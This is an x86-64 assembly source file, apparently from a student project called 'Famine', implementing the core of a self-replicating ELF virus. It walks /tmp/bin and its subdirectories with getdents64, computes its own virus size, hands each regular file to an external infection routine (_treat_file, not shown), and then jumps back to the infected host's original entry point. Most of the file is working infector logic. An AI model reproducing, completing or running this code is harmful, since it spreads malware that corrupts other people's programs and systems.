;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; struct linux_dirent64 {													;
;	int64_t			d_ino;		// 64-bit inode number			| offset 0	;
;	int64_t			d_off;		// 64-bit offset to next struct	| offset 8	;
;	unsigned short	d_reclen;	// size of this dirent			| offset 16	;
;	unsigned char	d_type;		// File type					| offset 18	;
;	char			d_name[];	// file name					| offset 19	;
; }																			;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

%define STACK_SIZE	(4096 * 1024)

section .text
	global _start
	global _string
	global _read_dir
	global _ft_strlen
	extern _treat_file
	extern _final_end
	extern _thread_create

_o_entry:
	dq 0x0000000000000000 

_string:
	db 'Famine version 1.0 (c)oded by cdrouet-rludosan', 0

_verif:
	dq 0x1122334455667788
	db 0

_start:
;	enter 16, 0
	push rbp
	mov rbp, rsp
	sub rsp, 16
;;;;;;;;;;;;;;;;;;;;;;
; save all registers ;
; to pop them in the ;
; same state before  ;
; we jmp on o_entry  ;
	push rbx ; +8
	push rcx ; +16
	push rdx ; +24
	push rsi ; +32
	push rdi ; +40
	push r8 ; +48
	push r9 ; +56
	push r10 ; +64
	push r11 ; +72
	push r12 ; +80
	push r13 ; +88
	push r14 ; +96
	push r15 ; +104
	cmp QWORD [rsp + 128], 3
	je _alternative_start
_continue_normaly:
;	lea rax, [rel _o_entry]
;	cmp QWORD [rax], 0
;	jne _jmp_to_o_entry
;;;;;;;;;;;;;;;;;;;;;;
;	push 0x000000000000002f ; /
	mov rax, 0x0000000000000000
	push rax
	push rax
;	mov rax, 0x747365742f706d74 ; tmp/test
	mov rax, 0x006e69622f706d74 ; tmp/bin
	push rax
	mov rdi, rsp
	mov rsi, rsp
	add rsi, 16
	mov rax, 1
	push rax
	push rsi
	push rdi
	call _read_dir
;	mov BYTE [rsp + 24], 0x32
;	mov rdi, rsp
;	mov rsi, rsp
;	add rsi, 16
;	call _read_dir
	pop rdi
	pop rdi
	pop rdi
	pop rdi
	pop rdi
	pop rdi
	lea rax, [rel _o_entry] ; mov in rax the o_entry address
	cmp QWORD [rax], 0 ; if this address is 0, so we are in famine exec, and we need to exit
	jne _jmp_to_o_entry
_force_exit:
	mov rdi, 0
	mov rax, 60 ; exit syscall number, will not be in final code
	syscall

_alternative_start:
	mov r10, QWORD [rsp + 144]
	lea r11, [rel _verif]
	mov r11, QWORD [r11]
	cmp QWORD [r10], r11
	jne _continue_normaly
	mov rsi, QWORD [rsp + 152]
	mov rdi, QWORD [rsp + 136]
;	mov rsi, QWORD [rsp + 160]
	mov rax, 0
	push rax
	push rsi
	push rax
	call _read_dir
	pop rdi
	pop rdi
	pop rdi
	mov rdi, 0
	lea rax, [rel _force_exit]

;_munmap_thread:
;	mov rax, 11
;	mov rdi, rsp
;	add rdi, 16
;	sub rdi, STACK_SIZE
;	mov rsi, STACK_SIZE
;	syscall
;	mov rdi, 11
;	jmp _force_exit

_jmp_to_o_entry:
	pop r15
	pop r14
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rbx
	leave
	jmp [rax] ; jmp to o_entry

_ft_strlen: ; void ft_strlen(char *str)
	enter 16, 0
	xor rax, rax
	mov rbx, rdi
	cmp rdi, 0
	je _strlen_end
	mov rcx, -1
	cld
	repne scasb
	sub rdi, rbx
	mov rax, rdi
	sub rax, 1
_strlen_end:
	leave
	ret

_read_dir: ; void read_dir(char *actual_directory, char *path_of_dir)
;	push rbp
;	mov rbp, rsp
;	sub rsp, 368
	enter 392, 0
	; rsp + 0: dir struct
	; rsp + 280: virus size
	; rsp + 288: fd directory
	; rsp + 296: pointer to current dir file
	; rsp + 304: buffer end address
	; rsp + 312: address dir name 1arg
	; rsp + 320: size arg 1
	; rsp + 328: size arg 2
	; rsp + 336: total size
	; rsp + 344: 2 arg
	; rsp + 352: nb_thread launched
	; rsp + 360: bool, indicating if a binary have already been infected in the current directory
	; rsp + 368: bool, enable recursif
	; rsp - size: size of total path for this dir
	mov rdi, QWORD [rsp + 408]
	mov rsi, QWORD [rsp + 416]
	mov rax, QWORD [rsp + 424]
	mov QWORD [rsp + 368], rax
	mov QWORD [rsp + 312], rdi ; store first arg in stack
	mov QWORD [rsp + 344], rsi
	mov QWORD [rsp + 360], 0
	mov rdi, rsi ; calcul len of arg 2
	call _ft_strlen
	mov QWORD [rsp + 328], rax ; store arg2 len in stack
	mov rdi, QWORD [rsp + 312] ; take len of arg1
	call _ft_strlen
	mov QWORD [rsp + 320], rax ; store result in stack
	mov r10, QWORD [rsp + 320]
	mov QWORD [rsp + 336], r10
	mov r10, QWORD [rsp + 328]
	add QWORD [rsp + 336], r10
	add QWORD [rsp + 336], 2
	mov QWORD [rsp + 352], 0
;	mov rax, 9
;	mov rdi, 0
;	mov rsi, 4096
;	mov rdx, 3
;	mov r10, 34
;	mov r8, -1
;	mov r9, 0
;	syscall
;	cmp rax, 0
;	jle _end_ret
;	mov QWORD [rsp + 360], rax
;	add QWORD [rsp + 360], 4096
;	sub QWORD [rsp + 360], 8
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; we need a dynamic buffer to store our concatenation, but we can't touch rsp,
; to don't corrupt the datas offset is stack (if we sub 8 to rsp, rsp + 0 become rsp + 8)
; So we take rsp address, and write in the addresses under rsp.
; So the objectif is:
;
;	|	previous	|
;	|	function	|
;	|	stack frame	|
;	|	----------	|
;	|	rsp + 344	|
;	|	rsp + 336	|
;	|	   ...		|
;	|	rsp + 280	|
;	|	rsp + 0		|
;	|	----------	| < -- rsp is here, and we right under 	|
;	|		\0		|										|
;	|	actual dir	|										|
;	|		'/'		|										|
;	|	full path	|										|
;	|		dir		| <-------------------------------------|
;	|	----------	|
;
; But when we will need to call another function, the stack frame for the called function
; will probably be in our total path string, so we need to mov rsp on the full path string addr.
; To do this, here are the steps:
; mov r10, <memory addr of the total size of th full path string>
; sub rsp, r10
; sub rsp, 8	<---------| we sub rsp with a stack stored value, if we dont save this size in an easy addr
;							we will not be able to retrieve our stack, after the function call will be done.
;							So we take 8 Bytes to save our full path size in the top of the stack
; mov QWORD [rsp], r10
; add QWORD [rsp], 8	<-| 8 bytes for the size
; call <function>
; add rsp, QWORD [rsp]	<-| We pushed the full path size + 8 on stack, so now we just have to add it to rsp
;							to retrieve our stack frame
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; now we copy in our buffer: path_of_dir + '/' + actual_directory + '\0'
	mov rdi, rsp
	sub rdi, QWORD [rsp + 336]
	mov rsi, QWORD [rsp + 344]
	mov rcx, QWORD [rsp + 328]
	cld
	rep movsb
; add /
	mov rdi, rsp
	sub rdi, QWORD [rsp + 336]
	add rdi, QWORD [rsp + 328]
	mov BYTE [rdi], 0x2f ; '/'
; add arg1
	add rdi, 1
	mov rsi, QWORD [rsp + 312]
	mov rcx, QWORD [rsp + 320]
	cld
	rep movsb
; add \0
	mov rdi, rsp
	sub rdi, QWORD [rsp + 336]
	add rdi, QWORD [rsp + 328]
	add rdi, 1
	add rdi, QWORD [rsp + 320]
	mov BYTE [rdi], 0

_print:
	mov rax, 1
	mov rdi, 1
	mov rsi, rsp
	sub rsi, QWORD [rsp + 336]
	mov rdx, QWORD [rsp + 336]
	syscall
	mov rax, 1
	mov rdi, 1
	lea rsi, [rel _lol]
	mov rdx, 1
	syscall
	jmp _calculate_virus_size

_lol:
	db 10

_calculate_virus_size:
; virus_size = (&_final_end + 2) - &_string
	xor r10, r10 ; r10 = 0
	lea r10, [rel _final_end] ; r10 = &_final_end
	add r10, 2 ; final_end have 2 bytes of instrucitions
	xor r11, r11
	lea r11, [rel _string] ; r11 = &_string
	sub r10, r11 ; &_final_end -= &_string
	mov QWORD [rsp + 280], r10 ; virus size = r10

_open_dir:
;	push 0x0000000000002f2e ; push "./"
;	mov rdi, QWORD [rsp + 312] ; mov the stack address on rdi, addres of our string
	mov rdi, rsp
	mov r10, QWORD [rsp + 336]
	sub rdi, r10
	xor rsi, rsi ; rsi = 0, RD_ONLY
	xor rdx, rdx ; rdx = 0, flag unused
	mov rax, 0x2 ; open syscall number
	mov r10, QWORD [rsp + 336]
	sub rsp, r10
	sub rsp, 8
	mov QWORD [rsp], r10
	add QWORD [rsp], 8
	syscall ; open
	add rsp, QWORD [rsp]
;	pop rdi ; we pushed, so we pop
	cmp rax, -1 ; if open return something under or equal of -1, jump to end
	jle _close_dir
	mov QWORD [rsp + 288], rax ; fd directory = return of open (fd)

_file_loop:
; call getdents64
	mov rdx, 280 ; this is the size of our buffer
	mov rdi, QWORD [rsp + 288] ; mov the fd to the first argument
	mov rsi, rsp ; mov the stack pointer to the second argument
	mov rax, 217 ; getdents64 syscall number
	mov r10, QWORD [rsp + 336]
	sub rsp, r10
	sub rsp, 8
	mov QWORD [rsp], r10
	add QWORD [rsp], 8
	syscall
	add rsp, QWORD [rsp]
; check getdents64 return
	cmp rax, 0 ; we check if getdents64 read something, if not, we are at the end of dir or their is an error
	jle _close_dir
; set the theoric maximum address for the readed datas in our buffer
	mov r10, rax ; mov to r10 the number of bytes readed
	add r10, rsp ; set the maximum theoric address for the readed datas (start buffer address + number of bytes read)
	mov QWORD [rsp + 304], r10
	mov rsi, rsp ; initialize rsi with our buffer address on the stack
	mov QWORD [rsp + 296], rsi

_read_data:
; check if we are too far in memory
	mov r10, QWORD [rsp + 304]
	cmp QWORD [rsp + 296], r10 ; r10 is the address of the end of the buffer, so we check if our address is too far in memory
	jge _file_loop ; and we jump to read again the dir datas, to see if their is anothers datas to treat
; offset 18 is the file type. We check if it's a directory
	xor r12, r12 ; r12 = 0
	mov r12b, BYTE [rsi + 18]
	cmp r12, 4
	je _test_bool ;_recursiv_infect
; offset 18 is the file type. We check if it's a regular file
	xor r12, r12 ; r12 = 0
	mov r12b, BYTE [rsi + 18] 
	cmp r12, 8
	jne _continue
	cmp QWORD [rsp + 368], 1
	jne _treat_normally
	cmp QWORD [rsp + 360], 1
	je _continue
; now we call _treat_file, with our current file.
_treat_normally:
	add rsi, 19 ; in the dirent struct, the name of te file is at offset 19
	mov rdi, rsi
	mov rsi, QWORD [rsp + 280]
	mov r10, QWORD [rsp + 336]
	mov rdx, rsp
	sub rdx, r10
	sub rsp, r10
	sub rsp, 8
	mov QWORD [rsp], r10
	add QWORD [rsp], 8
	call _treat_file
	add rsp, QWORD [rsp]
	cmp rax, 0
	je _continue
; reinit rsi for next loop
	mov QWORD [rsp + 360], 1
	jmp _continue

_test_bool:
	cmp QWORD [rsp + 368], 1
	jne _continue

_recursiv_infect:
	mov rsi, QWORD [rsp + 296]
	add rsi, 19
	cmp WORD [rsi], 0x002e
	je _continue
	cmp WORD [rsi], 0x002e2e
	je _continue
;	mov rdi, rsi
;	mov rsi, rsp

;_check_for_max_fork:
;	cmp QWORD [rsp + 352], 4
;	jl _max_thread_per_process
;_lab_lol:
;;	call _read_dir
;	mov rax, 61
;	mov rdi, -1
;	mov rsi, 0
;	mov rdx, 0
;	mov r10, 0
;	mov r8, 0
;	syscall
;	dec QWORD [rsp + 352]
;	jmp _max_thread_per_process

;_max_thread_per_process:
;	lea rdi, [rel _read_dir]
;	mov rdx, rsp
;	mov r10, QWORD [rsp + 336]
;	mov rsi, QWORD [rsp + 296]
;	add rsi, 19
;	sub rdx, r10
;	sub rsp, r10
;	sub rsp, 8
;	mov QWORD [rsp], r10
;	add QWORD [rsp], 8
;	call _thread_create
;	add rsp, QWORD [rsp]
;	cmp rax, -1
;	jg _update_rsp

	mov rdi, QWORD [rsp + 296]
	add rdi, 19
	mov rsi, rsp
	mov r10, QWORD [rsp + 336] 
	sub rsi, r10
	sub rsp, r10
	sub rsp, 8
	mov QWORD [rsp], r10
	add QWORD [rsp], 8
	mov rax, 1
	push rax
	push rsi
	push rdi
	call _read_dir
	pop rdi
	pop rdi
	pop rdi
	add rsp, QWORD [rsp]
	jmp _continue
_update_rsp:
	inc QWORD [rsp + 352]

_continue:
; reinit/increment registers/stack variable for next loop
	mov rsi, [rsp + 296]
	xor r11, r11 ; clear r11
	mov r11w, WORD [rsi + 16] ; in dirent struct, at offset 16, their is a short (2 bytes) describing the len of the file
	add rsi, r11 ; we add this len on our current struct address to access next struct
	mov QWORD [rsp + 296], rsi
	jmp _read_data

_close_dir:
; Close directory
	mov rax, 3
	mov rdi, QWORD [rsp + 288]
	syscall
	jmp _end_ret

_loop_wait_for_all_thread_to_exit:
	cmp QWORD [rsp + 352], 0
	jle _end_ret
	mov rax, 61
;	mov r10, rsp
;	mov rsp, QWORD [r10 + 360]
;	pop rdi
;	mov QWORD [r10 + 360], rsp
;	mov rsp, r10
	mov rdi, -1
;	mov rdi, 0
	mov rsi, 0
	mov rdx, 0
	mov r10, 0
;	mov rdx, 0
	mov r8, 0
	syscall
	dec QWORD [rsp + 352]
	jmp _loop_wait_for_all_thread_to_exit

_end_ret:
;	mov rax, 11
;	mov rdi, QWORD [rsp + 360]
;	mov rsi, 4096
;	syscall
	leave
	ret
